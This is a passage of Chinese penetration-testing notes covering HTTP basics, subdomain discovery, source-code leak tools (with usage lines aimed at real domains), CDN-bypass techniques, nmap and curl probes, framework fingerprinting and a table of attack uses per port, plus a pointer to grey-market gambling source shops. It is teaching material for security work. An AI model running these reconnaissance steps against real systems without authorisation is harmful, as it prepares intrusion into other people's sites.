Permanently\n资源永久迁移，客户端应更新书签（SEO 权重转移）\nLocation: /new-url\n是\n\n\n302\n\nFound\n资源临时重定向，客户端保持原 URL（不转移 SEO 权重）\nLocation: /temp-url\n否\n\n\n304\n\nNot Modified\n资源未修改，客户端使用缓存（需配合 If-Modified-Since 头）\nETag, Last-Modified\n是\n\n\n307\n\nTemporary Redirect\n临时重定向且要求 HTTP 方法不变（如 POST 请求仍为 POST）\nLocation: /temp-redirect\n否\n\n\n308\n\nPermanent Redirect\n永久重定向且要求 HTTP 方法不变\nLocation: /new-path\n是\n\n\n400\n4xx (客户端错误)\nBad Request\n请求语法错误（如参数缺失、格式无效）\n-\n是\n\n\n401\n\nUnauthorized\n未提供有效身份凭证（需认证）\nWWW-Authenticate: Basic\n是\n\n\n403\n\nForbidden\n权限不足（如用户无权访问资源）\n-\n是\n\n\n404\n\nNot Found\n资源不存在（URL 错误或已删除）\n-\n是\n\n\n408\n\nRequest Timeout\n服务器等待请求超时（客户端发送过慢）\n-\n否\n\n\n429\n\nToo Many Requests\n客户端请求频率超限（触发速率限制）\nRetry-After: 60\n否\n\n\n500\n5xx (服务器错误)\nInternal Server Error\n服务器内部错误（代码异常、配置问题）\n-\n否\n\n\n502\n\nBad Gateway\n网关服务器收到上游无效响应（如 Nginx 后端服务崩溃）\n-\n否\n\n\n503\n\nService Unavailable\n服务暂时不可用（过载或维护）\nRetry-After: 3600\n否\n\n\n504\n\nGateway Timeout\n网关等待上游响应超时（如数据库查询超时）\n\n\n\n\n\n关键特性说明\n**1.幂等性\n\n幂等操作（如 GET/PUT/DELETE）：多次重复请求效果相同，客户端可安全重试\n非幂等操作（如 POST）：重复请求可能导致资源重复创建，需谨慎处理\n\n**2.重定向类型对比\n\n\n\n特性\n301/308\n302/307\n\n\n\n\n持久性\n永久\n临时\n\n\nSEO 影响\n转移权重\n保留原权重\n\n\n方法保持\n301 可改方法 308 禁止改方法\n302 可改方法 307 禁止改方法\n\n\n\n3.响应头**（Response Headers）**\n\n\n\n关键响应头\n作用\n\n\n\n\nContent-Type: text/html\n响应体类型（如 application/json）\n\n\nSet-Cookie: sessionId=...\n向客户端写入 Cookie（属性：HttpOnly、Secure、SameSite）\n\n\nCache-Control: max-age=3600\n缓存控制策略（如 public、no-cache）\n\n\nLocation: /new-path\n重定向目标地址（配合 3xx 状态码）\n\n\n\n4.响应体**（Response Body）**\n\n内容形式：HTML、JSON、图片等服务器返回的实际数据\n长度标识：Content-Length 或分块传输编码\n\n四、HTTP 方法全集\n\n\n\n方法\n语义\n幂等性\n安全性\n应用场景\n\n\n\n\nGET\n获取资源\n是\n是\n页面加载、API 数据查询\n\n\nPOST\n创建资源\n否\n否\n表单提交、文件上传\n\n\nPUT\n替换整个资源\n是\n否\n全量更新用户信息\n\n\nDELETE\n删除资源\n是\n否\n删除文章\n\n\nPATCH\n部分更新资源\n否\n否\n修改用户昵称\n\n\nHEAD\n获取资源元数据\n是\n是\n检查链接有效性\n\n\nOPTIONS\n查询服务器支持的方法\n是\n是\nCORS 预检请求\n\n\nTRACE\n诊断连接路径\n是\n是\n网络调试\n\n\n\n五、HTTPS 对数据包的影响\n\n加密层：在 HTTP 与 TCP 间插入 TLS/SSL 协议（端口 443），对原始 HTTP 报文加密传输\n报文变化：\n\n明文 → 二进制加密数据（握手阶段协商对称密钥）\n保留 HTTP 语义，但无法直接读取内容（需解密）\n\n\n\n六、协议演进\n1.HTTP/1.1\n\n持久连接（Connection: keep-alive）\n分块传输（Transfer-Encoding: chunked）\n\n2.HTTP/2\n\n二进制分帧：将报文拆分为帧（Frame），多路复用提升效率\n头部压缩：HPACK 算法减少冗余\n\n3.HTTP/3\n\n基于 QUIC 协议（UDP），解决队头阻塞\n\n七、补充\n\n\n\n\n八、思维导图\n\n信息打点\n一、Web 应用\n1.Web 单域名\n查询方法：\n\n备案信息\n企业产权\n注册域名\n反查解析\n\n2.Web 子域名\n（1）DNS 数据查询\n\n\n原理：通过解析域名的权威 DNS 记录（NS、MX、TXT、CNAME 等），挖掘隐含的子域名信息。DNS 协议响应中可能暴露管理后台、邮件服务器等关键子域。\n\n\n记录类型分析：\n\nNS记录：权威 DNS 服务器（如 ns1.example.com）\nMX记录：邮件服务器子域（如 mail.example.com）\nTXT记录：可能包含 SPF 策略或隐藏子域线索\n\n\n\n优缺点：\n\n✅ 直接获取权威数据，准确性高\n❌ 依赖 DNS 配置完整性，隐私保护域名信息可能缺失\n\n\n\n（2）证书查询\n\n原理：基于证书透明度（Certificate Transparency, CT）政策，CA 机构公开所有 SSL/TLS 证书信息，证书中常包含主域名关联的子域名\n技术流程：\n\n证书日志聚合平台（如 crt.sh）抓取公开 CT 日志\n解析证书的 Subject Alternative Name (SAN) 字段，提取所有绑定域名\n关联同一组织证书，发现业务子域（如 api.example.com, dev.example.com）\n\n\n适用场景：\n\n发现 HTTPS 服务子域\n追踪证书更新历史中的废弃子域（如测试环境）\n\n\n\n（3）网络空间查询\n\n原理：通过扫描全网 IP 和开放端口，建立“IP-域名-服务”映射关系库，反向关联子域名\n数据关联技术：\n\nIP 反查：同一 IP 可能绑定多个子域名（如 CDN 节点）\n服务指纹识别：根据 HTTP 响应头、页面特征匹配归属组织\nASN 归属分析：通过 IP 段归属企业，推测未公开子域\n\n\n优势：覆盖范围广，可发现非标准 DNS 配置的资产\n\n（4）威胁情报查询\n\n原理：整合公开漏洞库、黑客论坛、恶意软件流量等数据源，提取攻击活动中暴露的子域名\n数据来源：\n\nVirusTotal：恶意文件通信域名、DNS 历史记录\nAlienVault OTX：众包威胁数据中的资产线索\nPassiveDNS：历史 DNS 解析存档（如 SecurityTrails）\n\n\n应用：\n\n发现钓鱼仿冒子域（如 login-example.com）\n定位 C&amp;C 服务器关联域名\n\n\n\n（5）枚举解析\n\n原理：通过字典轮询可能的子域名组合，向 DNS 服务器发起批量查询，筛选有效响应\n\n（6）对比与实战建议\n\n\n\n查询方式\n覆盖深度\n速度\n隐蔽性\n典型场景\n\n\n\n\nDNS 数据\n★★☆\n★★★\n★★☆\n快速获取权威记录\n\n\n证书查询\n★★★\n★★★★\n★★★★\nHTTPS 资产发现\n\n\n网络空间测绘\n★★★★\n★★☆\n★★★★\n全网资产关联分析\n\n\n威胁情报\n★★★☆\n★★★☆\n★★★★★\n对抗攻击溯源\n\n\n枚举解析\n★★★★★\n★☆\n★☆\n深度渗透测试（需授权）\n\n\n\n3.源码获取\n3.1.开源\n\n核心逻辑：开源项目具有普遍性和明显特征，可通过指纹识别快速定位框架类型，找到 cms，进而下载源码。\n实战技巧：\n\n对识别出的 CMS，访问其 /admin/login 等默认路径验证一致性；\n通过 GitHub 搜索特征字符串（如 JS 中的版权信息）定位源码仓库。\n\n\n\n3.2.闭源\n\n\n泄露的原因：\n\n1.从源码本身的特性入口\n2.从管理员不好的习惯入口\n3.从管理员不好的配置入口\n4.从管理员不好的意识入口\n5.从管理员资源信息搜集入口\n\n\n\n常见的 Web 源码泄露及其利用：\n\n\n（1）git 源码泄露\n\n\nGit 是一个开源的分布式版本控制系统，在执行 git init 初始化目录的时候，会在当前目录下自动创建一个 .git 目录，用来记录代码的变更记录等。发布代码的时候，如果没有把 .git 这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。\n\n\n漏洞利用工具：GitHack\n\n\ngithub 项目地址：https://github.com/lijiejie/GitHack\n\n\n用法示例：GitHack.py http://www.openssl.org/.git/\n\n\n修复建议：删除.git 目录或者修改中间件配置进行对.git 隐藏文件夹的访问。\n\n\n（2）svn 源码泄露\n\nSVN 是一个开放源代码的版本控制系统。在使用 SVN 管理本地代码过程中，会自动生成一个名为.svn 的隐藏文件夹，其中包含重要的源代码信息。网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到 WEB 服务器上，这就使.svn 隐藏文件夹被暴露于外网环境，可以利用.svn/entries 文件，获取到服务器源码。\n漏洞利用工具：Seay SVN 漏洞利用工具\n修复建议：删除 web 目录中所有.svn 隐藏文件夹，开发人员在使用 SVN 时，严格使用导出功能，禁止直接复制代码。\n\n（3）hg  源码泄露\n\nMercurial 是一种轻量级分布式版本控制系统，使用 hg init 的时候会生成.hg。\n漏洞利用工具：dvcs-ripper\n用法示例：rip-hg.pl -v -u http://www.example.com/.hg/\n\n（4）cvs 泄露\n\n\nCVS 是一个 C/S 系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对 CVS/Root 以及 CVS/Entries 目录，直接就可以看到泄露的信息。\n\n\n漏洞利用工具：dvcs-ripper\n\n\ngithub 项目地址：https://github.com/kost/dvcs-ripper.git\n\n\n运行示例：rip-cvs.pl -v -u http://www.example.com/CVS/\n\n\n（5）Bazaar/bzr 泄露\n\n\nbzr 也是个版本控制工具, 虽然不是很热门, 但它也是多平台支持, 并且有不错的图形界面。\n\n\n运行示例：rip-bzr.pl -v -u http://www.example.com/.bzr/\n\n\n（6）网站备份压缩文件\n\n管理员将网站源代码备份在 Web 目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露。\n常见的备份文件后缀：\n\n.rar\n.zip\n.tar.gz\n.bak\n.txt\n.old\n.temp\n\n\n测试工具用扫描的就行\n\n（7）WEB-INF/web.xml 泄露\n\nWEB-INF 是 Java 的 WEB 应用的安全目录，如果想在页面中直接访问其中的文件，必须通过 web.xml 文件对要访问的文件进行相应的映射才能访问。\nWEB-INF 主要包含以下文件或目录：\n\n12345WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.WEB-INF/database.properties : 数据库配置文件WEB-INF/classes/ : 一般用来存放Java类文件(.class)WEB-INF/lib/ : 用来存放打包好的库(.jar)WEB-INF/src/ : 用来放源代码(.asp和.php等)\n\n通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，在通过反编译 class 文件，得到网站源码。\n\n（8）DS-Store 文件泄露\n\n.DS_Store 是 Mac 下 Finder 用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果将.DS_Store 上传部署到服务器，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。\ngithub 项目地址：https://github.com/lijiejie/ds_store_exp\n用法示例：ds_store_exp.py http://hd.zj.qq.com/themes/galaxyw/.DS_Store\n\n（9）SWP 文件泄露\n\nswp 即 swap 文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为 .filename.swp。\n漏洞利用：直接访问.swp 文件，下载回来后删掉末尾的.swp，获得源码文件。\n\n（10）GitHub 源码泄露\n\nGitHub 是一个面向开源及私有软件项目的托管平台，很多人喜欢把自己的代码上传到平台托管。攻击者通过关键词进行搜索，可以找到关于目标站点的敏感信息，甚至可以下载网站源码。\n类似的代码托管平台还有很多，人才是最大的漏洞。\nGitHub 深度搜索：\n\n语法组合：in:readme 公司名 + language:php 定位内部项目；\n特征提取：扫描 JS/CSS 中的邮箱、API 密钥，反查员工公开仓库。\n\n\n\n3.3.黑灰产业源码商城\n\n通过谷歌搜索博彩源码商城、约友程序批发的关键词，定位境外平台（如 CodeCanyon 擦边板块）\n\n4.JS 前端架构\n4.1.什么是 JS 渗透测试？\n\n\n在 Javascript 中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞\nJS 开发的 WEB 应用和 PHP，JAVA, NET 等区别在于即没有源代码，也可以通过浏览器的\n查看源代码获取真实的点。获取 URL，获取 JS 敏感信息，获取代码传参等，所以相当于\nJS 开发的 WEB 应用属于白盒测试（默认有源码参考），一般会在 JS 中寻找更多的 URL\n地址，在 JS 代码逻辑（加密算法，APIkey 配置，验证逻辑等）进行后期安全测试。\n\n\n前提：Web 应用可以采用后端或前端语言开发\n\n后端语言：php java python .NET 浏览器端看不到真实的源代码\n前端语言：JavaScript(JS)和 JS 框架 浏览器端看到真实的源代码\n\n\n\n例子：\n\nzblog：核心功能采用 PHP 语言去传输接受\nvue.js：核心功能采用框架语法（JS）传输接受\n\n\n\n4.2. JS 泄漏的攻击面\n1.敏感信息硬编码\n\n凭证泄露：API 密钥、数据库密码、云服务 AK/SK 直接写在 JS 中（如阿里云 OSS 密钥），攻击者可直接调用云服务 API 篡改数据。\n用户隐私：姓名、手机号、身份证号未经脱敏渲染至前端（如某 FM 应用评论模块泄露用户邮箱）。\n测试数据残留：生产环境保留测试账号 Token，导致未授权登录后台\n\n2.接口路径暴露\n\n后台管理路径：JS 注释或配置中遗留调试接口（如 /admin/console、/api/internal），暴露攻击入口。\n未授权 API：前端路由配置泄露无需认证的 API（如数据查询接口），可被爬虫批量利用。\n\n3.系统架构信息\n\n技术栈标识：JS 引入文件路径（如 /static/js/app.js）暴露框架类型（Vue/React）\n版本控制痕迹：.map 文件泄露源码映射，便于逆向分析。\n\n4.3.流行的 JS 框架\n\nVue NodeJS jQuery Angular 等\n\n4.4. JS 开发应用的判定\n\n插件 wappalyzer\n源程序代码简短\n引入多个 js 文件\n一般有/static/js/app.js 等顺序的 js 文件\n一般 cookie 中有 connect.sid\n\n4.5. JS 信息提取技术方法\n1.手工提取\n\n浏览器进行抓包检查\n全局关键字\n\n123456789src=path=method:&quot;get&quot;http.get (&quot;method:&quot;post&quot;http.post (&quot;$.ajaxhttp://service.httpposthttp://service.httpget\n2.半自动提取\n\nBurp Suite 插件：\n\n自带功能：Target-&gt; sitemap-&gt; Engagement tools-&gt; Find scripts (脚本查找敏感信息)\n官方插件：JS Miner、JS Link Finder\n第三方插件：HaE、Unexpected_information\n插件加载器：jython-standalone-2.7.2\n\n\n\n3.自动提取\n\n\n\n工具类型\n代表工具\n功能\n\n\n\n\nURL/子域名提取\nJSFinder、URLFinder\n快速爬取 JS 中的接口路径和子域名\n\n\n敏感信息扫描\nHaE、FindSomething(浏览器插件)\n标记 JS 中的密钥、手机号、邮箱等敏感数据\n\n\nWebPack 解析\nPacker-Fuzzer、jjjjjjs\n解构 Webpack 打包的 JS 文件，提取隐藏接口\n\n\nFUZZ 测试\nffuf\n用 fuzz 爆破更多 JS，对提取的路径进行模糊测试，探测未授权访问\n\n\n\n4.6.高危漏洞案例\n1.后台路径泄露 → 云存储沦陷\n\n某网站 JS 文件泄露后台路径 /admin/config-backup，攻击者访问后获取 OSS 的 AK/SK，最终控制云存储桶删改文件。\n\n2.身份凭证硬编码 → 管理员权限获取\n\n前端 JS 内嵌测试账号 Token，攻击者替换登录包中的 Token 直接进入后台。\n\n3.用户数据无脱敏 → 批量隐私泄露\n\n某平台服务端返回用户身份证号、银行卡号至前端，通过源码查看可爬取全站用户隐私。\n\n5.识别防火墙\n\n\nWAF：Web 应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。利用国际上公认的一种说法：Web 应用防火墙是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。\n\n\nWAF 分类：\n\n云 WAF：百度安全宝、阿里云盾、长亭雷池，华为云，亚马逊云等\n硬件 WAF：绿盟、安恒、深信服、知道创宇等公司商业产品\n软件 WAF：宝塔，安全狗、D 盾等\n代码级 WAF：自己写的 waf 规则，防止出现注入等，一般是在代码里面写死的\n\n\n\n识别方法：\n\n看图识别：拦截页面，identywaf 项目内置\n识别项目：wafw00f   https://github.com/EnableSecurity/wafw00f\n\n\n\n6.蜜罐\n\n\n概念：蜜罐是一种安全威胁的检测技术，其本质在于引诱个欺骗攻击者，并且通过记录攻击者的攻击日志来产生价值。安全研究人员可以通过分析蜜罐的被攻击记录推测攻击者的意图和手段等信息。攻击方可以通过蜜罐识别技术来发现和规避蜜罐。因此，我们有必要站在红队的角度钻研蜜罐识别的方式方法\n\n\n识别：指纹识别，网络空间识别，常用端口，连续端口等。\n\n\n技术分类与特点：\n\n\n\n\n\n类型\n交互层级\n优势与局限\n\n\n\n\n低交互蜜罐\n模拟基础服务响应\n部署简单、低风险，但易被识别（如 Honeyd）。\n\n\n高交互蜜罐\n运行完整 OS/应用\n捕获深度攻击数据，但维护成本高（如 Nepenthes）。\n\n\n\n\n7.CDN 绕过\n一、CDN 介绍\n（1）前置知识\n\n\n传统访问：用户访问域名–&gt; 解析服务器 IP–&gt; 访问目标主机\n\n\n普通 CDN：用户访问域名–&gt; CDN 节点–&gt; 真实服务器 IP–&gt; 访问目标主机\n\n\n带 WAF 的 CDN：用户访问域名–&gt; CDN 节点（WAF）–&gt; 真实服务器 IP–&gt; 访问目标主机\n\n\n（2）CDN 的三种配置\n\n配置 1：加速域名-需要启用加速的域名\n配置 2：加速区域-需要启用加速的地区\n配置 3：加速类型-需要启用加速的资源\n\n（3）CDN 核心作用与绕过必要性\n1.CDN 的核心功能\n\n隐藏源站 IP：通过边缘节点代理用户请求，使攻击者无法直接定位真实服务器。\n加速与负载均衡：缓存静态资源，减少源站压力，提升访问速度\n安全防护：集成 WAF、DDoS 防御等能力（如 Cloudflare）\n\n2.为何要绕过 CDN\n\n渗透测试需求：定位真实 IP 以测试源站漏洞（如未修复的 0day）。\n应急响应：当 CDN 节点故障时，需直接访问源站排查问题。\n\n（4）识别\n\nnslookup（不重要）\n多地服务器 ping 判断\n\n二、绕过方法\n1.子域名挖掘\n\n原理：主站启用 CDN，但子域名（如 mail.example.com）常因配置遗漏暴露真实 IP。\n操作：ping 子域名得到不一样的 ip，然后查看备案，如果感觉像，就尝试 host（hosts Administrator）绑定 ip，ping 下主域名，强制解析到那个 ip 上\n\n2.历史 DNS 记录查询（老域名适用）\n\n原理：域名启用 CDN 前的解析记录可能留存于公共数据库。\n工具与平台：\n\nSecurityTrails：查看历史 A 记录，过滤 CDN IP\nViewDNS：提供 10 年内的解析历史\n微步在线：国内域名历史记录精准\n\n\n技巧：优先选择 最早解析的 IP，大概率是源站。\n\n3.SSL 证书反查\n\n原理：同一服务器证书可能关联多个域名，暴露真实 IP。\n操作：\n\n访问 https://example.com 获取证书 HASH。\n在 Censys 搜索 parsed.names: example.com，筛选 IP 归属。\n\n\n优势：绕过 CDN 缓存，直接定位服务器。\n\n4.国外节点访问\n\n原理：企业 CDN 可能未覆盖冷门地区（如南美、非洲），直连源站\n实操：\n\n工具：使用国外 VPS（如 AWS 巴西节点）直接访问目标域名。\n在线平台：tools.ipip.net/cdn.php 模拟全球 Ping 测试。\n\n\n注意：部分 CDN 已支持全球覆盖，需结合其他方法验证。\n\n5.邮件服务溯源\n\n原理：企业邮箱（如 admin@example.com）发送邮件时，邮件头常含源站 IP。\n步骤：\n\n1.触发邮件（密码重置/RSS 订阅）。\n2.查看邮件原文，搜索 Received: 字段：\n\n\n其他方法：通过发送错误邮件，让他的真实 ip 给你返回错误的信息，但需要有一个自己的收邮箱的服务器（qq 邮箱等不行）\n\n6.网络空间获取\n\n不准，但可以与自己找到的进行对比验证\n\n7.全面扫描\n\n原理：扫描全网 IP，匹配目标特征（如 favicon 哈希、HTTP 标题）\n操作：先确定是什么 cdn 提供服务，然后用纯真库找对应 cdn 大概位置的 ip 范围，然后将网站标题写入进去，进行扫描开放的端口对比信息，拿到真实 ip\n局限：耗时长，易触发安全告警。\n\n8.非标准端口探测\n\n原理：CDN 通常只代理 80/443 端口，SSH(22)、RDP(3389)等端口直连源站\n操作：\n\n1nmap -sS -p22,3389,3306 example.com  # 扫描非Web端口\n\n案例：某银行主站 CDN 防护，但 3389 端口开放且 IP 非 CDN 段，暴露源站.\n\n9.HTTP 标头篡改\n\n原理：篡改 Host 头，诱使 CDN 返回源站错误信息。\n测试命令：\n\n1curl -H &quot;Host: example.com&quot; http://CDN_IP -v\n\n成功标志：返回 404 或源站特有错误页。\n\n10.协议差异绕过\n\n场景：CDN 仅配置 HTTPS 时，访问 HTTP 可能直连源站\n验证：\n\n1curl http://example.com  # 返回真实IP或错误信息\n11.总结\n📊 方法对比与工具推荐\n\n\n\n方法\n适用场景\n工具推荐\n成功率\n操作难度\n\n\n\n\n子域名挖掘\n多子域名企业\nSublist3r + Dig\n★★★★☆\n★★☆☆☆\n\n\n历史 DNS 查询\n运营超 1 年的老域名\nSecurityTrails\n★★★☆☆\n★☆☆☆☆\n\n\n邮件溯源\n自建邮箱系统\n手动触发+邮件头分析\n★★★★☆\n★★☆☆☆\n\n\n国外访问\n未覆盖全球的 CDN\nVPS + cURL\n★★☆☆☆\n★★★☆☆\n\n\n全网扫描\n特征明显的网站\nMasscan + FOFA\n★★★★★\n★★★★☆\n\n\n非标准端口探测\n多端口服务\nNmap\n★★★☆☆\n★★★☆☆\n\n\n\n\n首选组合：子域名挖掘 + 历史DNS查询 + 邮件溯源 覆盖 90%场景。\n高阶突破：特征扫描（favicon/证书）适用于顽固目标。\n\n8.框架组件\n一、基础内容\n\n\n框架：简单代码的一个整合库，如果使用框架就只需要学习使用框架调用即可如：文件上传功能是需要很多代码来实现的，框架把这个代码进行封封装，调用即可影响：如果采用框架开发，代码的安全性是取决于框架的过滤机制\n\n\n组件：第三方的功能模块（日志记录，数据监控，数据转换等）\n\n\nWeb 架构：\n\n1、最简单最入门的开发模型（功能代码全部手写）\n\n最容易出现漏洞，程序员水平不一，没有第三方或团队的检测，单纯的自己写\n\n\n2、结合开发框架的开发模型（以框架为核心实现功能）\n\n第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架漏洞）\n\n\n3、结合开发框架外加组件模型（以框架为核心，组件为辅实现功能）\n\n第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架和组件漏洞）\n\n\n\n\n\n二、框架识别特征\npython-开发框架\n\n\nDjango：识别插件，Set-Cookie: expires =\n\n\nFlask：识别插件，Set-Cookie: expires =\n\n\nPHP-开发框架\n\nThinkPHP：\n\n识别插件\nX-Powered-By：ThinkPHP\nCMS 识别到源码体系 TP 开发\n\n\nLaravel：识别插件，Set-Cookie 中特征的格式\nYii：识别插件，Set-Cookie 中特征的格式\n\nJAVA-开发框架\n\nFastjson/Jackson：\n\n在提交 JSON 数据包中修改测试，Fastjson 组件会把 01 解析成 1，Jackson 组件在解析 01 是会抛出异常\nhttps://forum.butian.net/share/1679\nhttps://www.iculture.cc/forum-post/24115.html\n\n\nShiro：\n\n请求包的 cookie 中存在 rememberMe 字段。\n返回包中存在 set-Cookie：rememberMe = deleteMe\n请求包中存在 rememberMe = x 时，响应包中存在 rememberMe = deleteMe\n有时候服务器不会主动返回 rememberMe = deleteMe, 直接发包即可，将 Cookie 内容改为 rememberMe = 1，若相应包有 rememberMe = deleteMe，则基本可以确定网站是 apache shiro 搭建的\n\n\nStrusts2：一般使用 struts2 框架后缀带 do 或 action，可以尝试进行利用\nSpringboot：\n\n通过 web 应用程序网页标签的小绿叶图标\n通过 Springboot 框架默认报错页面\n\n\nSolr：一般开放 8983 端口，访问页面也可以探针到\n\n二、主机服务器\n1.端口扫描\n\n\n基础概念：在计算机网络通信中，端口是应用程序或服务用于监听传入连接或发送传出数据的逻辑端点。每个端口都由一个 16 位的数字标识，范围从 0 到 65535\n\n\n端口的重要性：\n\n服务识别：特定端口通常与特定服务关联，例如，80 端口用于 HTTP 服务，443 端口用于 HTTPS 服务，22 端口用于 SSH 服务。通过识别开放端口，我们可以推断目标系统可能提供的功能。\n安全评估：开放了不必要的端口或运行着已知漏洞的服务，都可能成为攻击者的入口。端口扫描是安全审计和渗透测试的第一步。\n网络故障排查：确定服务是否正常运行，可以通过检查其监听的端口状态来判断。\n\n\n\n端口分类：\n\n知名端口(Well-Known Ports)：0-1023，由 IANA(Internet Assigned Numbers Authority)分配和控制，用于常见的网络服务，如 HTTP(80), FTP(21), SSH(22)等。\n注册端口(Registered Ports)：1024-49151，可由用户或应用程序注册，用于特定的应用程序或服务。\n动态/私有端口(Dynamic/Private Ports)：49152-65535，通常由客户端程序随机选择，用于临时通信。\n\n\n\n端口扫描工具：Nmap（综合）、Masscan（快速）、网络空间（方便）\n\n\n\n\n\n端口\n协议\n服务\n渗透用途\n\n\n\n\n20,21\nTCP\nFTP\n匿名上传下载、爆破、嗅探、Windows 提权、远程执行（如 proftpd 1.3.5）、后门利用（如 vsftpd 2.3.4）\n\n\n22\nTCP\nSSH\n爆破、SSHv1 中间人攻击、隧道代理、内网转发、文件传输\n\n\n23\nTCP\nTelnet\n爆破、嗅探（常见于路由器/交换机弱口令）\n\n\n25\nTCP\nSMTP\n邮件伪造、VRFY/EXPN 用户枚举（工具：smtp-user-enum）\n\n\n53\nTCP/UDP\nDNS\n区域传送劫持、DNS 投毒、欺骗、DNS 隧道远控\n\n\n69\nTCP/UDP\nTFTP\n下载重要配置文件（如网络设备配置）\n\n\n80-89, 443\nTCP\nWeb 服务\nWeb 漏洞利用（注入、XSS、框架漏洞）、控制台爆破（如 OWA, VPN, Webmail）\n\n\n110\nTCP\nPOP3\n爆破、嗅探\n\n\n111, 2049\nTCP\nNFS\n权限配置不当导致未授权访问\n\n\n137,139,445\nTCP\nSamba\n爆破、漏洞利用（MS08-067, MS17-010）、嗅探\n\n\n143\nTCP\nIMAP\n爆破 5\n\n\n161\nUDP\nSNMP\n默认团体字符串爆破、内网信息搜集\n\n\n389\nTCP\nLDAP\n注入、匿名访问、弱口令\n\n\n512-514\nTCP\nLinux rexec\n爆破、rlogin 登录\n\n\n873\nTCP\nRsync\n匿名访问、文件上传\n\n\n1194\nTCP\nOpenVPN\n钓取 VPN 账号进入内网\n\n\n1352\nTCP\nLotus\n弱口令、信息泄漏\n\n\n1433\nTCP\nSQL Server\n注入、提权、sa 弱口令爆破\n\n\n1521\nTCP\nOracle\nTNS 协议爆破、注入、反弹 Shell\n\n\n1723\nTCP\nPPTP\n爆破、钓取 VPN 账号\n\n\n2181\nTCP\nZooKeeper\n未授权访问\n\n\n3306\nTCP\nMySQL\n注入、提权、弱口令爆破\n\n\n3389\nTCP\nRDP\nShift 后门（Windows Server 2003 以下）、爆破、MS12-020 漏洞\n\n\n3690\nTCP\nSVN\n源码泄露、未授权访问\n\n\n4848\nTCP\nGlassFish\n弱口令\n\n\n5432\nTCP\nPostgreSQL\n爆破、注入、弱口令\n\n\n5900-5902\nTCP\nVNC\n弱口令爆破\n\n\n5984\nTCP\nCouchDB\n未授权导致的任意指令执行\n\n\n6379\nTCP\nRedis\n未授权访问、弱口令爆破\n\n\n7001-7002\nTCP\nWebLogic\nJava 反序列化、弱口令\n\n\n8080-8089\nTCP\nJenkins/JBoss\n反序列化、控制台弱口令\n\n\n9200,9300\nTCP\nElasticSearch\n远程代码执行（如 CVE-2015-1427）\n\n\n11211\nTCP\nMemcached\n未授权访问（可被用于 DDoS 放大攻击）\n\n\n27017-27018\nTCP\nMongoDB\n爆破、未授权访问\n\n\n50070,50030\nTCP\nHadoop\n默认端口未授权访问（如信息泄露）\n\n\n\n三、APP 应用\n1.信息分类\n\n资产信息：\n\nip-端口服务、域名-Web 安全、接口-API 安全\n\n\n泄露信息：\n\n邮箱配置、接口配置、oss 配置\n\n\n代码信息：\n\nJAVA 代码安全问题\n\n\n\n2.获取 APP\n\n从名称获取 APP 信息：爱企查、小蓝本、七麦、点点\n\n1234https://www.xiaolanben.com/https://aiqicha.baidu.com/https://www.qimai.cn/https://app.diandian.com/\n\nURL 获取 APP 信息：\n\n查备案信息在搜\n网站上有 APP 下载\n市场直接搜单位名称\n\n\n\n3.提取技术\n\n三种方式及其表现：\n\n抓包-动态表现\n提取-静态表现&amp;动态调试\n搜索-静态表现\n\n\n\n（1）抓包表现出来的数据\n\n优点：没有误报\n缺点，无法做到完整\n\n（2）反编译从源码中提取数据\n\n优点：数据比较完整\n缺点：有很多无用资产信息\n\n（3）动态调试从表现中提取数据\n\n\n优点：\n\n没有误报，解决不能抓包不能代理的情况\n搞逆向的能看到实时的 app 调用链等\n\n\n\n缺点：无法做到完整\n\n\n案列：某 APP 打开无数据包，登录有数据包（反编译后未找到目标资产，抓包住到了）\n\n\n原因：那个登录界面是 APP 打包的资源，并没有对外发送数据\n\n\n静态分析工具：\n\nMobsf（也可以动态调试+模拟器）\nAppInfoScanner\n在线平台：https://www.zhihuaspace.cn:8888/、https: / /mogua.co/\n\n\n\n四、小程序应用\n1.获取小程序\n\n直接搜索关键字就行\n常见小程序的应用：微信、支付宝、百度、抖音头条\n\n2.小程序结构\n\n主体结构：小程序包含一个描述整体程序的 app 和多个描述各自页面的 page。一个小程序主体部分(即 app)由三个文件组成，必须放在项目的根目录，如下：\n\n\n\n\n文件\n必需\n作用\n\n\n\n\napp.js\n是\n小程序逻辑\n\n\napp.json\n是\n小程序公共配置\n\n\napp.wxss\n否\n小程序公共样式表\n\n\n\n\n一个小程序页面由四个文件组成，分别是：\n\n\n\n\nxxx.js\n页面\n\n\n\n\nxxx.json\n页面配置\n\n\nxxx.wxml\n页面结构\n\n\nxxx.wxss\n页面样式\n\n\n\n\n项目整体目录结构：\n\n\n\n\npages\n页面文件夹\n\n\n\n\nindex\n首页\n\n\nlogs\n日志\n\n\nutils\n\n\n\nutil\n工具类(mina 框架自动生成, 你也可以建立一个：api)\n\n\napp.js\n入口 js(类似于 java 类中的 main 方法)、全局 js\n\n\napp.json\n全局配置文件\n\n\napp.wxss\n全局样式文件\n\n\nproject.config.json\n跟你在详情中勾选的配置一样\n\n\nsitemap.json\n用来配置小程序及其页面是否允许被微信索引\n\n\n\n3.提取技术\n\n\n微信路径：设置-文件管理-路径下/Appiet\n\n\n逆向静态提取：解包、反编译\n\n\n动态抓包提取：Proxifier、Burpsuite\n\n\n动态调试提取: 小程序助手、官方开发工具\n\n\n五、微信公众号\n\n获取微信公众号途径：https://weixin.sogou.com/\n微信公众号有无第三方服务\n\n六、其他\n1.Github 监控-开发&amp;配置&amp;源码\n\n目标中开发人员或者托管公司上传的项目存在源码泄漏或配置信息（密码密匙等），人员数据库等敏感信息，找到多个脆弱点。\n人员&amp;域名&amp;邮箱等筛选\n\neg：xxx.cn password in: file\n\n\nGithub 